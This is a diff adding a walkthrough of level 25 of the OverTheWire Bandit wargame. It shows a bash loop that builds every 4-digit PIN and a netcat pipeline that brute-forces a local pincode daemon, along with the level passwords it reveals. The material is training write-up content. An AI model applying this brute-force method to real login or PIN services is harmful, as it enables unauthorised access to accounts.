@@ -261,3 +261,66 @@ Script got deleted, which means cron executed it and we got our password!
 > **Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 ---
+
+## Bandit 25
+
+[http://overthewire.org/wargames/bandit/bandit25.html](http://overthewire.org/wargames/bandit/bandit25.html)
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+Our first bash for loop! You may want to read more about it [here](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-7.html).
+
+First let's see how the daemon behaves. 
+
+```console
+bandit24@bandit:/tmp/bd2425$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+Wrong! Please enter the correct pincode. Try again.
+```
+
+Okay looks like if we enter the wrong pin then it ruturns an error and it allows multiple input. So now we can create essentially a dictionary file with the format "password pin" for 0000-9999.
+
+Let's create a temp directory and our dictionary:
+
+```console
+bandit24@bandit:/tmp/bd2425$ `for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pincodes.txt; done  `
+bandit24@bandit:/tmp/bd2425$ `head pincodes.txt`
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 3
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 4
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 6
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 7
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 8
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9
+bandit24@bandit:/tmp/bd2425$ `tail pincodes.txt`
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9990
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9991
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9992
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9993
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9994
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9995
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9996
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9997
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9998
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
+```
+
+Looks good now let's feed it to `nc` and invert-match using `grep`.
+
+```console
+bandit24@bandit:/tmp/bd2425$ `nc -nv 127.0.0.1 30002 < pincodes.txt | grep -v Wrong`
+Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+Exiting.
+```
+
+> **Username:** bandit24
+> **Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+---
